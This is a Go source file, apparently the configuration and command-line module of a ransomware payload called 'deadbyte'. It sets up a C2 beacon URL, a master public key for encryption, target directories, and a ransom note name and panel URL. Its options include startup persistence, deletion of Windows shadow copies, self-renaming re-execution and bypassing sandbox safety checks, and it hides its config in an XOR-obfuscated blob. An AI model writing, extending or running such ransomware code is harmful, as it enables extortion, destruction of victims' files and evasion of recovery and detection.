package main

import (
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"os"
	"strings"
)

// Config is the runtime configuration of the payload. It can be supplied via
// flags, build-time ldflags, or as an obfuscated blob (-config).
type Config struct {
	C2         string `json:"c2"`
	PubKey     string `json:"pubkey"`
	Token      string `json:"token,omitempty"`
	Dirs       string `json:"dirs"`
	Ext        string `json:"ext,omitempty"`
	MaxSize    int64  `json:"max_size,omitempty"`
	Delay      int    `json:"delay,omitempty"`
	Jitter     int    `json:"jitter,omitempty"`
	Interval   int    `json:"interval,omitempty"`
	NoteName   string `json:"note_name,omitempty"`
	NoteURL    string `json:"note_url,omitempty"`
	Insecure   bool   `json:"insecure,omitempty"`
	DryRun     bool   `json:"dry_run,omitempty"`
	Offline    bool   `json:"offline,omitempty"`
	Persist    bool   `json:"persist,omitempty"`
	WipeVSS    bool   `json:"wipe_vss,omitempty"`
	SelfRename bool   `json:"self_rename,omitempty"`
	Force      bool   `json:"force,omitempty"`
	Verbose    bool   `json:"verbose,omitempty"`
	LogFile    string `json:"log_file,omitempty"`
	MaxFiles   int    `json:"max_files,omitempty"`
}

func defaults() Config {
	return Config{MaxSize: 100 << 20, Jitter: 20, Interval: 15, NoteName: "README_DEADBYTE.txt", NoteURL: "https://panel.deadbyte.local"}
}

// xorKey obfuscates the config blob (cosmetic, not cryptographic).
const xorKey = 0xA7

func packConfig(c Config) (string, error) {
	b, err := json.Marshal(c)
	if err != nil {
		return "", err
	}
	for i := range b {
		b[i] ^= xorKey
	}
	return base64.StdEncoding.EncodeToString(b), nil
}

func unpackConfig(s string) (Config, error) {
	var c Config
	raw, err := base64.StdEncoding.DecodeString(s)
	if err != nil {
		return c, err
	}
	for i := range raw {
		raw[i] ^= xorKey
	}
	if err := json.Unmarshal(raw, &c); err != nil {
		return c, err
	}
	return c, nil
}

// Build-time variables (inject via -ldflags "-X main.BuiltinC2=...").
var (
	BuiltinC2     = ""
	BuiltinPubKey = ""
	BuiltinToken  = ""
)

func parseConfig() (Config, error) {
	cfg := defaults()
	fs := flag.NewFlagSet("deadbyte", flag.ContinueOnError)
	var configBlob string
	fs.StringVar(&configBlob, "config", "", "obfuscated config blob (use -config-gen)")
	var configGen bool
	fs.BoolVar(&configGen, "config-gen", false, "print an obfuscated config blob from the given flags and exit")
	fs.BoolVar(&cfg.DryRun, "dry-run", false, "enumerate targets only, do not encrypt")
	fs.BoolVar(&cfg.Offline, "offline", false, "encrypt without C2 beacon")
	fs.BoolVar(&cfg.Persist, "persist", false, "install startup persistence")
	fs.BoolVar(&cfg.WipeVSS, "wipe-vss", false, "Windows: delete shadow copies (admin)")
	fs.BoolVar(&cfg.SelfRename, "self-rename", false, "copy self to random temp name and re-exec")
	fs.BoolVar(&cfg.Force, "force", false, "ignore sandbox/root safety aborts")
	fs.BoolVar(&cfg.Verbose, "verbose", false, "verbose logging")
	fs.StringVar(&cfg.LogFile, "log-file", "", "append verbose log to this file (visible diagnostics)")
	fs.BoolVar(&cfg.Insecure, "insecure-tls", false, "skip TLS verification")
	fs.StringVar(&cfg.C2, "c2", "", "C2 beacon URL")
	fs.StringVar(&cfg.PubKey, "pubkey", "", "master X25519 public key (base64)")
	fs.StringVar(&cfg.Token, "token", "", "shared beacon token")
	fs.StringVar(&cfg.Dirs, "dirs", "", "comma-separated target roots (empty = auto-discover user profiles)")
	fs.StringVar(&cfg.Ext, "ext", "", "allowed extensions (comma list); empty = all except denylist")
	fs.StringVar(&cfg.NoteName, "note-name", "", "ransom note filename")
	fs.StringVar(&cfg.NoteURL, "note-url", "", "panel URL shown in the note")
	fs.Int64Var(&cfg.MaxSize, "max-size", cfg.MaxSize, "skip files larger than this (bytes)")
	fs.IntVar(&cfg.Delay, "delay", 0, "initial execution delay (seconds)")
	fs.IntVar(&cfg.Jitter, "jitter", cfg.Jitter, "sleep/beacon jitter percent")
	fs.IntVar(&cfg.Interval, "interval", cfg.Interval, "heartbeat interval (seconds)")
	fs.IntVar(&cfg.MaxFiles, "max-files", 0, "stop after this many files (0 = unlimited)")

	if err := fs.Parse(os.Args[1:]); err != nil {
		return cfg, err
	}

	explicit := map[string]bool{}
	fs.Visit(func(f *flag.Flag) { explicit[f.Name] = true })

	if configGen {
		out, err := packConfig(cfg)
		if err != nil {
			return cfg, err
		}
		fmt.Println(out)
		os.Exit(0)
	}

	if configBlob != "" {
		bc, err := unpackConfig(configBlob)
		if err != nil {
			return cfg, fmt.Errorf("config: %w", err)
		}
		applyBlob(&cfg, bc, explicit)
	}

	if cfg.PubKey == "" {
		cfg.PubKey = BuiltinPubKey
	}
	if cfg.C2 == "" {
		cfg.C2 = BuiltinC2
	}
	if cfg.Token == "" {
		cfg.Token = BuiltinToken
	}
	cfg.Dirs = strings.TrimSpace(cfg.Dirs)
	if cfg.NoteName == "" {
		cfg.NoteName = "README_DEADBYTE.txt"
	}
	if cfg.NoteURL == "" {
		cfg.NoteURL = "https://panel.deadbyte.local"
	}
	if cfg.Interval <= 0 {
		cfg.Interval = 15
	}
	if cfg.MaxSize <= 0 {
		cfg.MaxSize = 100 << 20
	}
	return cfg, nil
}

func applyBlob(cfg *Config, b Config, explicit map[string]bool) {
	if !explicit["pubkey"] && cfg.PubKey == "" {
		cfg.PubKey = b.PubKey
	}
	if !explicit["c2"] && cfg.C2 == "" {
		cfg.C2 = b.C2
	}
	if !explicit["token"] && cfg.Token == "" {
		cfg.Token = b.Token
	}
	if !explicit["dirs"] && cfg.Dirs == "" {
		cfg.Dirs = b.Dirs
	}
	if !explicit["ext"] && cfg.Ext == "" {
		cfg.Ext = b.Ext
	}
	if !explicit["max-size"] {
		cfg.MaxSize = b.MaxSize
	}
	if !explicit["delay"] {
		cfg.Delay = b.Delay
	}
	if !explicit["jitter"] {
		cfg.Jitter = b.Jitter
	}
	if !explicit["interval"] {
		cfg.Interval = b.Interval
	}
	if !explicit["note-name"] {
		cfg.NoteName = b.NoteName
	}
	if !explicit["note-url"] {
		cfg.NoteURL = b.NoteURL
	}
	if !explicit["insecure-tls"] {
		cfg.Insecure = b.Insecure
	}
	if !explicit["dry-run"] {
		cfg.DryRun = b.DryRun
	}
	if !explicit["offline"] {
		cfg.Offline = b.Offline
	}
	if !explicit["persist"] {
		cfg.Persist = b.Persist
	}
	if !explicit["wipe-vss"] {
		cfg.WipeVSS = b.WipeVSS
	}
	if !explicit["self-rename"] {
		cfg.SelfRename = b.SelfRename
	}
	if !explicit["force"] {
		cfg.Force = b.Force
	}
	if !explicit["verbose"] {
		cfg.Verbose = b.Verbose
	}
	if !explicit["log-file"] && cfg.LogFile == "" {
		cfg.LogFile = b.LogFile
	}
	if !explicit["max-files"] {
		cfg.MaxFiles = b.MaxFiles
	}
}

func (c Config) extAllow() map[string]bool {
	if c.Ext == "" {
		return nil
	}
	m := map[string]bool{}
	for _, e := range strings.Split(c.Ext, ",") {
		e = strings.TrimSpace(e)
		if e == "" {
			continue
		}
		if !strings.HasPrefix(e, ".") {
			e = "." + e
		}
		m[strings.ToLower(e)] = true
	}
	return m
}
